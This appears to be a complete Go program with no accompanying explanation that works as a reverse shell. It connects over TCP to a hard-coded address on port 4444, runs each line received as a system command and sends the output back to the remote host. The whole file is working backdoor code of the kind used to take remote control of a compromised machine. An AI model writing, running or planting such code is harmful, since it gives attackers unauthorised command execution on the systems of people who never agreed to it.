package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
)

func main() {
	hostName := "10.55.56.4"
	portNum := "4444"
	conn, err := net.Dial("tcp", hostName + ":" + portNum)

	if err != nil {
		fmt.Println(err)
		return
	}

	for {
		message, _ := bufio.NewReader(conn).ReadString('\n')

		out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()

		if err != nil {
			fmt.Fprintf(conn, "%s\n",err)
		}

		fmt.Fprintf(conn, "%s\n",out)

	}
}